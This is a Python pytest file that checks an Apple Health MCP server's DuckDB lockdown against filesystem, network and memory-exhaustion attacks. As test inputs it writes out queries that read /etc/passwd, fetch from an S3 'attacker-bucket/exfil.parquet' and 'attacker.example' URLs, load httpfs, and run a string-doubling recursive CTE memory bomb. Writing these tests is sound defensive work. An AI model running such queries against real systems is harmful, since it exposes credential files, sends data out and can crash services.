"""Engine-level safety pins for the v0.5.1 #190 lockdown.

These tests run against a real DuckDB connection (in-memory) so they
exercise the production safety contract end-to-end:

* The validator's parse-time denylist (``server.safety``) rejects every
  Apple Health MCP server-facing fs / network function — including the
  v0.5.1 aliases (parquet_scan / parquet_metadata / parquet_schema /
  sniff_csv) flagged by the v0.5.0 adversarial review.
* The engine itself refuses any fs / network function once
  ``enable_external_access`` is off, even when the validator is
  bypassed (the engine is the load-bearing root-cause fix; the
  validator is defense-in-depth).
* The HTTPS-URL egress path that surfaced data exfiltration in
  the v0.5.0 adversarial test is closed at the engine level.

These are deliberately *integration* tests rather than unit tests
against ``validate_query`` alone — the v0.5.0 dogfood lesson was that
the validator's denylist had aliases the team had not enumerated, and a
unit test against ``validate_query`` could not have caught the gap
because the unit test only exercises whatever names the suite already
knows about. Hitting the engine directly tests "what happens if a
future DuckDB release adds yet another alias the validator does not
know" — the answer must be a hard engine-level reject, never a
silent succeed.
"""

from __future__ import annotations

import asyncio
from pathlib import Path

import duckdb
import pytest

from apple_health_mcp.db import get_in_memory_connection
from apple_health_mcp.db.connection import get_connection
from apple_health_mcp.server.safety import DENIED_FUNCTIONS
from apple_health_mcp.server.tools import run_custom_query
from tests._helpers import bind_tool

# v0.5.1 #190 (post-#200 code-review Angle Reuse): build the
# parametrize list from ``DENIED_FUNCTIONS`` so the engine-level
# pin auto-tracks the validator's denylist. The function signatures
# differ (``glob`` takes a directory pattern; everything else takes
# a file path), so we build the call expression per-name.
#
# ``read_text_auto`` and ``read_blob_auto`` live in
# ``DENIED_FUNCTIONS`` (defence-in-depth at parse time) but DuckDB
# does not currently expose them as engine functions — invoking them
# raises ``Catalog Error: Table Function ... does not exist`` rather
# than the security ``Permission Error``. We exclude them from the
# engine-level pin since the validator's denylist still covers them
# at parse time (see ``test_validate_query_rejects_denied_scalar_call``
# in ``tests/unit/server/test_safety.py``), and re-pinning a function
# that does not exist in the engine would give us a false security
# signal.
_ENGINE_ABSENT_FUNCTIONS = frozenset({"read_text_auto", "read_blob_auto"})
_ENGINE_REACHABLE_DENIED = sorted(DENIED_FUNCTIONS - _ENGINE_ABSENT_FUNCTIONS)


def _denied_function_call(fn: str) -> str:
    """Render ``fn`` as a TABLE-function invocation with a syntactically
    valid argument so the engine reaches the ``enable_external_access``
    gate (otherwise the call fails at parse time and the test pins the
    wrong layer)."""
    if fn == "glob":
        return f"{fn}('/etc/*')"
    return f"{fn}('/etc/passwd')"


# v0.5.1 #190 (Angle A/Reuse): the four SSRF aliases sit in
# ``DENIED_FUNCTIONS`` so they come along for free in the parametrize
# above. The keywords that count as "engine refused external access"
# must be security-specific — any generic DuckDB error keyword
# (``catalog`` / ``invalid input`` / ``extension``) would also match
# an unrelated regression where ``parquet_scan`` was renamed or the
# extension stopped existing, and the test would silently pass
# without actually verifying the lockdown.
_SECURITY_ERROR_KEYWORDS: tuple[str, ...] = (
    "enable_external_access",
    "external access",
    "permission",
    "not enabled",
    "disabled",
)


def _assert_security_error(exc: duckdb.Error) -> None:
    """Assert ``exc`` is a real external-access denial, not a generic miss."""
    msg = str(exc).lower()
    assert any(keyword in msg for keyword in _SECURITY_ERROR_KEYWORDS), (
        f"engine error was {exc!r}; expected one of {_SECURITY_ERROR_KEYWORDS}"
    )


@pytest.mark.parametrize("fn", _ENGINE_REACHABLE_DENIED)
def test_engine_rejects_filesystem_table_functions(fn: str) -> None:
    """``SET enable_external_access = false`` blocks every fs table function.

    Bypasses the validator and goes straight to ``conn.execute`` so the
    test pins the ENGINE-level guarantee. A regression in
    ``_set_engine_safety_pragmas`` (e.g. the setting silently failing
    to apply on a future DuckDB release) would surface here even if
    the validator's denylist still listed all the right names.

    Parametrized off ``sorted(DENIED_FUNCTIONS)`` so the engine-level
    pin auto-tracks the validator's denylist — including the v0.5.1
    SSRF aliases (``parquet_scan`` / ``parquet_metadata`` /
    ``parquet_schema`` / ``sniff_csv``) and the ``_auto`` variants
    that an earlier hand-rolled list missed.
    """
    conn = get_in_memory_connection()
    try:
        with pytest.raises(duckdb.Error) as exc_info:
            conn.execute(f"SELECT * FROM {_denied_function_call(fn)}").fetchall()
        _assert_security_error(exc_info.value)
    finally:
        conn.close()


@pytest.mark.parametrize(
    "url",
    [
        "https://raw.githubusercontent.com/duckdb/duckdb/main/README.md",
        "http://127.0.0.1/secret.parquet",
        "s3://attacker-bucket/exfil.parquet",
    ],
)
def test_engine_rejects_https_and_remote_url_fetches(url: str) -> None:
    """The v0.5.0 SSRF surface (parquet_scan('https://...')) stays closed.

    A successful HTTPS / S3 fetch in this test would mean the engine
    is silently letting httpfs / S3 extensions resolve the URL — the
    exact "external send" path the project's privacy contract
    forbids. ``enable_external_access = false`` should refuse the
    URL before httpfs can even be loaded.

    Tightened post-#200 code-review (Angle A): the error message must
    match a security-specific keyword so a CI image without httpfs
    pre-installed cannot silently pass via an unrelated
    'extension not found' error.
    """
    conn = get_in_memory_connection()
    try:
        with pytest.raises(duckdb.Error) as exc_info:
            conn.execute(f"SELECT * FROM parquet_scan('{url}')").fetchall()
        _assert_security_error(exc_info.value)
    finally:
        conn.close()


@pytest.mark.parametrize(
    "stmt",
    [
        # File-backed ATTACH
        "ATTACH '/tmp/attacker.db' AS f",
        # v0.5.1 #190 (post-#200 code-review Angle B): URL-backed
        # ATTACH closes a separate egress path that the file-backed
        # variant does not exercise. DuckDB resolves the URL via
        # httpfs, which the engine refuses under the lockdown.
        "ATTACH 'https://attacker.example/x.db' AS f",
        "INSTALL httpfs",
        "LOAD httpfs",
    ],
)
def test_engine_rejects_file_or_url_attach_install_load(stmt: str) -> None:
    """File-/URL-backed ATTACH, INSTALL, and LOAD all go through the same lockdown.

    DuckDB's ``enable_external_access`` covers extension loading
    (INSTALL / LOAD) and both file- and URL-backed cross-DB attachment
    in addition to file reading; this test pins the symmetry so a
    future contributor cannot accidentally widen the safety contract
    to "only file reads". ``ATTACH ':memory:'`` is deliberately NOT
    pinned -- it does not touch the filesystem and DuckDB
    intentionally allows it under the locked-down setting.
    """
    conn = get_in_memory_connection()
    try:
        with pytest.raises(duckdb.Error):
            conn.execute(stmt)
    finally:
        conn.close()


def test_in_memory_connection_has_external_access_off() -> None:
    """Invariant probe (in-memory): the setting flipped to false and stays there.

    A regression test for the ``_set_engine_safety_pragmas`` call site
    -- if a future PR accidentally drops the SET statement, the value
    reverts to true and every other safety test would still pass on
    the validator path while leaving the engine wide open.
    """
    conn = get_in_memory_connection()
    try:
        row = conn.execute("SELECT current_setting('enable_external_access')").fetchone()
        assert row is not None
        assert str(row[0]).lower() == "false"
    finally:
        conn.close()


@pytest.mark.parametrize("read_only", [False, True])
def test_on_disk_connection_has_external_access_off(tmp_path: Path, read_only: bool) -> None:
    """Invariant probe (on-disk): the production serve paths inherit the lockdown.

    Mirrors :func:`test_in_memory_connection_has_external_access_off`
    against ``get_connection`` for both writable and read-only opens.
    Post-#200 code-review (Angle C) flagged that the original probe
    only covered the in-memory path; a refactor that removed the
    helper call from ``get_connection`` while leaving
    ``get_in_memory_connection`` untouched would have passed every
    other security test (they all flow through the in-memory path)
    and shipped the regression to production.
    """
    db_path = tmp_path / "h.duckdb"
    conn = get_connection(db_path, read_only=False)
    try:
        # Force the file into existence so the read-only re-open below
        # has something to land on.
        pass
    finally:
        conn.close()
    conn = get_connection(db_path, read_only=read_only)
    try:
        row = conn.execute("SELECT current_setting('enable_external_access')").fetchone()
        assert row is not None
        assert str(row[0]).lower() == "false"
    finally:
        conn.close()


def test_recursive_cte_does_not_hang_server() -> None:
    """v0.6 (#222/#223): a runaway recursive CTE fails fast, server stays up.

    v0.5.1 dogfood Phase 3 defect #2: ``run_custom_query`` on an
    unbounded recursive CTE (materialising intermediate state) hung the
    whole MCP server process under DuckDB's pre-hardening 50 GiB
    default ``memory_limit`` -- even ``get_server_info`` stopped
    responding, and only a physical Claude Desktop restart recovered
    it. The string-doubling CTE below is a *fast* OOM trigger (a
    monotonic-integer counter alone does not exceed the 2 GB ceiling
    quickly enough for a CI-friendly test) -- doubling a string's
    length on every recursive step blows past the cap within a few
    iterations. The regression this guards against is
    ``_set_engine_safety_pragmas`` losing its ``memory_limit`` pragma
    (or a future DuckDB release changing OOM behaviour): either would
    let this query run away again.
    """
    conn = get_in_memory_connection()
    fn = bind_tool(run_custom_query, conn)
    bomb_sql = (
        "WITH RECURSIVE bomb(s) AS ("
        "SELECT 'A' UNION ALL SELECT s || s FROM bomb WHERE length(s) < 2000000000"
        ") SELECT max(length(s)) FROM bomb"
    )
    out = asyncio.run(fn(query=bomb_sql))
    assert out.startswith("Error:")
    assert "out of memory" in out.lower()

    # The server (this connection) must still answer subsequent tool
    # calls -- the whole point of the hardening is that a self-DoS
    # query fails in isolation instead of taking the process down.
    follow_up = asyncio.run(fn(query="SELECT 1 AS x"))
    assert not follow_up.startswith("Error:")


def test_lock_configuration_prevents_reenable() -> None:
    """v0.6 (#222): once locked, the hardening set cannot be SET back.

    ``run_custom_query`` only ever forwards ``SELECT``/``WITH``
    statements (``validate_query`` rejects everything else before it
    reaches the engine), so a ``SET`` re-enable attempt through the
    public tool surface is already caught at the validator layer. This
    test instead pins the engine-level guarantee directly -- the same
    pattern ``test_engine_rejects_file_or_url_attach_install_load``
    uses -- so a future refactor that bypasses the validator (or a
    DuckDB upgrade that changes how ``SET`` failures surface) cannot
    silently regress the second line of defence.
    """
    conn = get_in_memory_connection()
    try:
        with pytest.raises(duckdb.Error, match="lock"):
            conn.execute("SET enable_external_access = true;")
    finally:
        conn.close()
